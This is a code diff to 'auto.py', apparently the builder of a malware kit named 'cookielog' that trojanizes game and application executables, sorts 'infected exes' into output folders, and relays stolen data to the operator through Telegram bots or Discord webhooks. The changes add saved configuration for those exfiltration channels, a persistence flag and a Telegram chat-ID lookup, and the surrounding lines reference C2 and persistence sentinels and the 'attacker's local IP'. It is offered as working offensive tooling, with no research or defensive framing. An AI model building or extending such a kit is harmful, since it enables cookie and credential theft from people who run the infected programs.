@@ -22,6 +22,13 @@ Usage:
     python auto.py game.exe --telegram bot_token:chat_id   # relay via Telegram
     python auto.py game.exe --discord https://discord.com/api/webhooks/...  # relay via Discord
 
+    python auto.py --config             # show saved settings (config.json)
+    python auto.py --clear-telegram     # remove saved Telegram token
+    python auto.py --clear-discord      # remove saved Discord webhook
+
+    Telegram/Discord keys are saved to config.json automatically on first use.
+    After that, just run:  python auto.py game.exe   (keys are loaded from config)
+
 Output structure:
     ifec/
       folds/   <- infected exes that need their folder (games, apps with DLLs/data)
@@ -39,7 +46,7 @@ What it does:
 
 Press Ctrl+C to stop early.
 """
-import json, os, shutil, socket, subprocess, sys, time, struct
+import json, os, shutil, socket, subprocess, sys, time, struct, urllib.request, urllib.parse
 
 HERE   = os.path.dirname(os.path.abspath(__file__))
 BIN    = os.path.join(HERE, "bin")
@@ -51,6 +58,7 @@ IFEC_FOLDS = os.path.join(IFEC, "folds")
 IFEC_APPS  = os.path.join(IFEC, "apps")
 LISTEN = os.path.join(HERE, "listen.py")
 BUILD  = os.path.join(HERE, "build.bat")
+CONFIG = os.path.join(HERE, "config.json")
 MAGIC  = b"CKLG"
 C2_SENTINEL = b"CKC2_DEADBEEF_"
 PERSIST_SENTINEL = b"CKPR____"
@@ -58,6 +66,78 @@ PERSIST_ENABLE = b"CKPR0001"
 
 def log(msg):
     print(msg, flush=True)
+
+# ------------------------------------------------------------------ config persistence
+# config.json stores telegram token, discord webhook, default port, and persist flag.
+# When --telegram / --discord is passed via CLI, it's saved automatically.
+# When no flag is passed, saved values are loaded from config.json.
+
+def load_config():
+    """Load config.json. Returns dict with telegram, discord, port, persist."""
+    if os.path.exists(CONFIG):
+        try:
+            with open(CONFIG, encoding="utf-8") as f:
+                return json.load(f)
+        except Exception:
+            pass
+    return {}
+
+def save_config(cfg):
+    """Save config dict to config.json."""
+    try:
+        with open(CONFIG, "w", encoding="utf-8") as f:
+            json.dump(cfg, f, indent=2, ensure_ascii=False)
+    except Exception as ex:
+        log("[-] failed to save config: %s" % ex)
+
+def show_config():
+    """Print current saved config."""
+    cfg = load_config()
+    log("=" * 50)
+    log("  Saved configuration (config.json)")
+    log("=" * 50)
+    if not cfg:
+        log("  (empty -- no saved settings)")
+    else:
+        tg = cfg.get("telegram", "")
+        if tg:
+            # Show bot token partially masked + chat ID
+            parts = tg.rsplit(":", 1)
+            if len(parts) == 2:
+                bot, chat = parts
+                masked = bot[:8] + "..." + bot[-4:] if len(bot) > 12 else bot
+                log("  Telegram:  %s : %s" % (masked, chat))
+            else:
+                log("  Telegram:  %s" % tg)
+        else:
+            log("  Telegram:  (not set)")
+        dc = cfg.get("discord", "")
+        if dc:
+            # Mask the webhook token part
+            masked = dc[:50] + "..." if len(dc) > 50 else dc
+            log("  Discord:   %s" % masked)
+        else:
+            log("  Discord:   (not set)")
+        log("  Port:      %s" % cfg.get("port", 9090))
+        log("  Persist:   %s" % ("enabled" if cfg.get("persist") else "disabled"))
+    log("=" * 50)
+
+def tg_lookup_chatid(bot_token):
+    """Query Telegram getUpdates API to find the chat_id of the latest message sender.
+    Returns (chat_id string, or None). The user must have sent a message to the bot first."""
+    try:
+        url = "https://api.telegram.org/bot%s/getUpdates" % bot_token
+        req = urllib.request.Request(url)
+        resp = urllib.request.urlopen(req, timeout=10)
+        data = json.loads(resp.read().decode("utf-8"))
+        if data.get("ok") and data.get("result"):
+            # Get the last message's chat ID
+            last = data["result"][-1]
+            chat_id = last["message"]["chat"]["id"]
+            return str(chat_id)
+        return None
+    except Exception:
+        return None
 
 def detect_ip():
     """Detect attacker's local IP (not 127.0.0.1)."""
@@ -490,6 +570,9 @@ def main():
     telegram = None
     discord = None
     persist = False
+    show_cfg = False
+    clear_tg = False
+    clear_dc = False
 
     # parse args
     args = sys.argv[1:]
@@ -508,6 +591,12 @@ def main():
             discord = args[i + 1]; i += 2
         elif a == "--persist":
             persist = True; i += 1
+        elif a == "--config":
+            show_cfg = True; i += 1
+        elif a == "--clear-telegram":
+            clear_tg = True; i += 1
+        elif a == "--clear-discord":
+            clear_dc = True; i += 1
         elif not a.startswith("--"):
             # join remaining non-flag args as the host path (handles spaces)
             parts = []
@@ -516,6 +605,56 @@ def main():
             host_arg = " ".join(parts)
         else:
             i += 1
+
+    # --config: show saved settings and exit
+    if show_cfg:
+        show_config()
+        return 0
+
+    # --clear-telegram / --clear-discord: remove from config and exit
+    if clear_tg or clear_dc:
+        cfg = load_config()
+        if clear_tg:
+            cfg.pop("telegram", None)
+            log("[+] Telegram cleared from config")
+        if clear_dc:
+            cfg.pop("discord", None)
+            log("[+] Discord cleared from config")
+        save_config(cfg)
+        return 0
+
+    # Load saved config for values not passed via CLI
+    cfg = load_config()
+    if telegram is None and cfg.get("telegram"):
+        telegram = cfg["telegram"]
+        log("[*] Telegram: loaded from config.json")
+    if discord is None and cfg.get("discord"):
+        discord = cfg["discord"]
+        log("[*] Discord: loaded from config.json")
+    if not persist and cfg.get("persist"):
+        persist = True
+        log("[*] Persist: loaded from config.json")
+    if port == 9090 and cfg.get("port"):
+        port = cfg["port"]
+
+    # Save new values to config if provided via CLI
+    cfg_new = load_config()
+    changed = False
+    if telegram and telegram != cfg_new.get("telegram"):
+        cfg_new["telegram"] = telegram
+        changed = True
+    if discord and discord != cfg_new.get("discord"):
+        cfg_new["discord"] = discord
+        changed = True
+    if persist != bool(cfg_new.get("persist")):
+        cfg_new["persist"] = persist
+        changed = True
+    if port != cfg_new.get("port"):
+        cfg_new["port"] = port
+        changed = True
+    if changed:
+        save_config(cfg_new)
+        log("[+] config.json updated")
 
     log("=" * 60)
     log("  cookielog -- automatic payload setup")
